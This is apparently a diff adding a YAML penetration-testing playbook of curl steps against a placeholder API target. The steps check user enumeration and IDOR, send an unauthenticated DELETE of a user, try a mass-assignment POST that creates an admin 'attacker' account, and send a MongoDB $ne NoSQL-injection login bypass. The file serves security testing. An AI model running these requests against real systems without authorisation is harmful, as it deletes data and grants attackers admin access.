@@ -1,0 +1,26 @@
+steps:
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/users"
+      additional_args: '-s -L -X GET -H "Accept: application/json" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'API: GET all users - test for unauthorized data enumeration'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/users/1"
+      additional_args: '-s -L -X GET -H "Accept: application/json" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'API: GET specific user by ID - test for IDOR (Insecure Direct Object Reference)'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/users/1"
+      additional_args: '-s -L -X DELETE -H "Accept: application/json" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'API: DELETE user without authentication - test for broken access control'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/users"
+      additional_args: '-s -L -X POST -H "Content-Type: application/json" -d "{\"username\":\"attacker\",\"password\":\"password\",\"role\":\"admin\"}" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'API: Mass assignment test - attempt to set admin role during registration'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/users"
+      additional_args: '-s -L -X POST -H "Content-Type: application/json" -d "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'API: NoSQL injection test using MongoDB operators ($ne) in JSON body'
